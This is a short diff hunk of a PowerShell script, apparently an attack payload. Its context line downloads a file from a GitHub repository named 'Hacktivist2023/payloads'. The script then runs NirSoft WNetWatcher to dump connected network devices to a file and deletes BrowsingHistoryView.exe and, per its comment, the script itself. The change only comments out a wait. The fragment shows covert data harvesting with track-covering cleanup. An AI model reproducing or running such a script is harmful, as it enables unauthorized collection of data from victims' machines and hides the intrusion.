@@ -14,7 +14,7 @@ Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support
 .\WNetWatcher.exe /stext connected_devices.txt 
 
 # Wait for 60 seconds (because connected devices file take a minute to be created)
-Start-Sleep -Seconds 60
+# Start-Sleep -Seconds 60
 
 # Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
